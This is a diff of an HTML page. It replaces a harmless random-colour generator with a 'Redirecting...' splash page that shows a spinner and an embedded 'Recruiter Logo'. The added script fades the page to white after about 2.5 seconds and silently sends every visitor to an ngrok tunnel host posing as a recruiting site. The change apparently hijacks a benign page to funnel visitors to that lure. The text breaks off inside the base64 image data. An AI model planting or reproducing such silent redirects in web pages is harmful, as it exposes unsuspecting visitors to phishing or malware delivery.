@@ -1,133 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>#000000</title>
-    <link type="image/x-icon" rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAHklEQVQ4T2NkYGD4z0ABYBw1gGE0DBhGw4BhWIQBAE5OEAELnjVHAAAAAElFTkSuQmCC">
-    <style>
-        :root {
-            --color: #000000;
-            --color-transparent: #00000022;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirecting...</title>
+  <style>
+    /* === Base Layout === */
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #f9fafb, #e8f1ff);
+      font-family: "Segoe UI", Arial, sans-serif;
+      color: #333;
+      overflow: hidden;
+      animation: fadeIn 1s ease-in-out forwards;
+      position: relative;
+      text-align: center;
+      padding: 0 20px;
+    }
 
-        ::selection {
-            background: var(--color-transparent);
-        }
+    /* === Recruiter Logo === */
+    .logo {
+      width: 200px;
+      max-width: 70%;
+      height: auto;
+      margin-bottom: 25px;
+      opacity: 0;
+      animation: fadeInUp 1s ease-in-out forwards;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
 
-        html,
-        body {
-            background: var(--color);
-            height: 100%;
-            margin: 0;
-        }
+    /* === Spinner === */
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #007bff;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      margin-bottom: 15px;
+      opacity: 0;
+      animation: fadeInUp 1s ease-in-out 0.5s forwards, spin 1s linear infinite;
+    }
 
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
+    /* === Text === */
+    p {
+      font-size: 1rem;
+      opacity: 0;
+      animation: fadeInUp 1s ease-in-out 1s forwards;
+    }
 
-        #color {
-            background: white;
-            color: var(--color);
-            font-size: 2.5rem;
-            font-weight: 300;
-            padding: 2.25rem 3rem;
-            font-family: -apple-system, BlinkMacSystemFont, avenir next, avenir, helvetica neue, helvetica, ubuntu, roboto, noto, segoe ui, arial, sans-serif;
-            cursor: text;
-        }
-    </style>
+    /* === White Fade Overlay === */
+    .fade-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.8s ease-in-out;
+      z-index: 10;
+    }
+
+    /* === Animations === */
+    @keyframes spin {
+      0% { transform: rotate(0deg); border-top-color: #007bff; }
+      50% { border-top-color: #8a5fff; }
+      100% { transform: rotate(360deg); border-top-color: #007bff; }
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* === Responsive Adjustments === */
+    @media (max-width: 600px) {
+      .logo {
+        width: 140px;
+        margin-bottom: 20px;
+      }
+      .loader {
+        width: 35px;
+        height: 35px;
+      }
+      p {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+
+  <script>
+    // Wait 2.5 seconds, then fade to white before redirect
+    setTimeout(() => {
+      const overlay = document.querySelector('.fade-overlay');
+      overlay.style.opacity = '1';
+      setTimeout(() => {
+        window.location.href = "https://recruitinglb.ngrok.pro";
+      }, 800); // Redirect after fade-to-white
+    }, 2500);
+  </script>
 </head>
-
 <body>
-    <p id="color">#000000</p>
-    <script>
-        function randomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1) + min);
-        }
+  <div class="fade-overlay"></div>
 
-        function hslToHex(h, s, l) {
-            h /= 360;
-            s /= 100;
-            l /= 100;
-            var r = void 0,
-                g = void 0,
-                b = void 0;
-            if (s === 0) {
-                r = g = b = l; // achromatic
-            } else {
-                var hue2rgb = function hue2rgb(p, q, t) {
-                    if (t < 0) t += 1;
-                    if (t > 1) t -= 1;
-                    if (t < 1 / 6) return p + (q - p) * 6 * t;
-                    if (t < 1 / 2) return q;
-                    if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
-                    return p;
-                };
-                var q = l < 0.5 ? l * (1 + s) : l + s - l * s;
-                var p = 2 * l - q;
-                r = hue2rgb(p, q, h + 1 / 3);
-                g = hue2rgb(p, q, h);
-                b = hue2rgb(p, q, h - 1 / 3);
-            }
-            var toHex = function toHex(x) {
-                var hex = Math.round(x * 255).toString(16);
-                return hex.length === 1 ? '0' + hex : hex;
-            };
-            return '#' + toHex(r) + toHex(g) + toHex(b);
-        }
-
-        window.onload = function () {
-            let stopProp = function (ev) {
-                ev.stopPropagation();
-            }
-
-            var colorElement = document.getElementById("color");
-            colorElement.addEventListener("click", stopProp, false);
-            colorElement.addEventListener("mousedown", stopProp, false);
-
-            var setFavicon = function (hex) {
-                var canvas = document.createElement('canvas');
-                canvas.width = 16;
-                canvas.height = 16;
-                var ctx = canvas.getContext('2d');
-                ctx.fillStyle = hex;
-                ctx.fillRect(0, 0, 16, 16);
-                document.getElementsByTagName('link')[0].href = canvas.toDataURL("image/x-icon");
-            }
-
-            var setRandomColor = function setRandomColor() {
-                var h = void 0,
-                    s = void 0,
-                    l = void 0;
-
-                h = randomInt(0, 359);
-                s = randomInt(55, 75);
-                l = randomInt(40, 60);
-
-                document.documentElement.style.setProperty('--color', 'hsl(' + h + ', ' + s + '%, ' + l + '%)');
-                var hex = hslToHex(h, s, l);
-                document.title = hex;
-                colorElement.innerHTML = hex;
-                document.documentElement.style.setProperty('--color-transparent', hex + '22');
-
-                setFavicon(hex);
-            };
-            setRandomColor();
-
-            var body = document.getElementsByTagName("body")[0];
-            body.addEventListener("mousedown", function (ev) {
-                ev.preventDefault();
-            });
-            body.addEventListener("click", function () {
-                setRandomColor();
-            }, false);
-        };
-    </script>
-</body>
-
-</html>
+  <!-- Recruiter Logo (Base64) -->
+  <img
+    class="logo"
+    src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAzAMBIgACEQEDEQH/xAAbAAADAQADAQAAAAAAAAAAAAAAAQIDBQYHBP/EADYQAAEDAwMCBAQDBwUAAAAAAAEAAgMEBREGEiETMQdBUWEicYGRFDKxFSNCUqGy0RYzNVRi/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AO/AKsIAVAYQIBVhCoBAsJ4TwqAQQGp7eVYCeEE7UAKsIwgnCWFeEYQThIhXtTIQZ4TwqwU9qDPCNqvCeEGW1LC0wghBkQlhaYSIQZkKcLQhIjhBmUlRCSCgqwk1WEABlUAgDCaAA5VgIAVBAsJ4TTwgnCYCrCeEEYQr2phiDPCFrtCNgQZYR5LUsSLOEGeEiFe1GEGeEEK8JIMyFOFoQpIQQQpKsqSgzUlaYUFBQVhSMKwEFAJgJBaNCAwmE8JgIBPCYVAIEAmGptCsBBIamqxyjagnCMK9qYagzwhXhBagzIUlq0wkQgxIU4WpCkhBmkQrIUlBkVJWhCgoIKg91o4einCBhWOyhoVhB891ro7Xa6q4TAuZTROkLR3dgdl55aKPVeuWzV0uoH2qh6hayKnB747NwQTj+Zx7+S9HraSGvoZqOoaTFOwxvwcHBHkvPI36i8P5ZGChNzs735L4+NvlnIB2n2Ix7oOB1JqC+1lzmghutVBTUrjDG2F5YX7eC5xHJJPOMrvPhjfq+7UVXS3SUzzUjm7Z3cGRrs4z7gg8+a6y/wD0/qq4Pnt9XPb6mZrpZoJoWlmRy4h24DJ9F92ntZ6V05SmngjuEr5H5lqHQAF5+WTgD0Qen4KpoXBaf1dZL/J0rfWtM+M9GRpY/HqAe/0XIXG701skjZUsmw+N8hcxmQxjSA5x9viCDkQEw1cU++0rGySdKodAx/SbM2PLZJN23Y3nJJccdsLk6WV08IkdBLCSSNkrcOGEGgaq2pgKkEgIwrwghBBCkhaYSfhrS5xwAMkoMy1QRhde03rmz6julRbrf1xNC1zwZI8NkaCAS0/Mjv6rsj+MZ8+yDIqHBangqHIMipKsqEElZlaFQ5Bm7spVlQSgpqsKGqwgtvCtpIPBx7qGqwg6XcKSll8SqaEwxN61smJ+ADc45GT7911bQht8N+ktN4oaaZtRmJvXi3FkrT+Xn15+oC+/xGrqy26woa63yCOohpvhcW5ByTkEehXX9Q0V6irTdblRyUM1RP1Y3AYAf34Qc54m6ct9kdb7nZYxR1HWIDIzgNc0ZDm+nnkduQu06nuViittsuGoZ3x1UlNup4YAC8PdtdvaCDjaWjBPHrldfsGnrnrSphvOpbjHNRB
